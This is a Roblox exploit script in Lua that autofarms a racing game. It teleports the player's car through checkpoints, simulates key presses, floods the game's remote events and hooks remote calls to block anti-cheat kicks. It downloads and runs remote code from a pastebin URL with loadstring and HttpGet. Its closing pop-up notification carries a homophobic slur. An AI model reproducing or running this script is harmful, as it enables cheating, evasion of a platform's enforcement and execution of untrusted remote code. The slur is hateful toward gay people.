local waitTime = 3
local found = false
local go = true
function findVehicle()
while not found do
local vehicles = Workspace.Vehicles:getChildren()
for i=1,#vehicles do
if vehicles[i]:findFirstChild'owner' then
if vehicles[i].owner.Value == game:GetService'Players'.LocalPlayer.Name then 
found = true 
vehicle = vehicles[i]
elseif vehicles[i + 1] == nil and not found then
end
end
end
wait(1)
end
wait(2)
vehicle.PrimaryPart = vehicle.Chassis.VehicleSeat
end
local c = 10
game.RunService.Heartbeat:Connect(function()
local A_1 = 14
local Event = game:GetService("ReplicatedStorage")["Game Modes V2"].Shared.Remotes.RemoteEvents.Invite
Event:FireServer(A_1)
local A_1 = 14
local Event = game:GetService("ReplicatedStorage")["Game Modes V2"].Shared.Remotes.RemoteFunctions["join_mode"]
Event:InvokeServer(A_1)
local A_1 = 14
local Event = game:GetService("ReplicatedStorage")["Game Modes V2"].Shared.Remotes.RemoteEvents.Invite
Event:FireServer(A_1)
end)
local racing = false
function farm()
coroutine.wrap(function()
while true do
wait()
game:GetService'VirtualUser':SetKeyUp("w")
game:GetService'VirtualUser':SetKeyDown("w")
for i = 1,20 do
pcall(function()
vehicle:SetPrimaryPartCFrame(workspace.Camera["Checkpoint_"..i].CFrame)
game:GetService'VirtualUser':SetKeyUp("w")
game:GetService'VirtualUser':SetKeyDown("w")
wait()
end)
end
end
end)()
end
findVehicle()
if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end
local doom 
for i,v in pairs(game.ReplicatedStorage.Playerdata:GetChildren()) do
if v:IsA("RemoteEvent") and v.Name ~= "send_msg" and v.Name ~= "mobile" and v.Name ~= "bustdownthotiana" then
v:AddCallHook("FireServer", function(o, ...)
print'Nice try kicking me!'
end)
end
end
farm()
local data = {
    ["Title"] = "My cheeks hurt",
    ["Text"] = "ScxredLixHub",
    ["Button1"] = "OK Fag",
    ["Duration"] = 10
}
game:GetService("StarterGui"):SetCore("SendNotification", data)
local data = {
    ["Title"] = "",
    ["Text"] = "Must be In Car",
    ["Button1"] = "",
    ["Duration"] = 10
}
game:GetService("StarterGui"):SetCore("SendNotification", data)
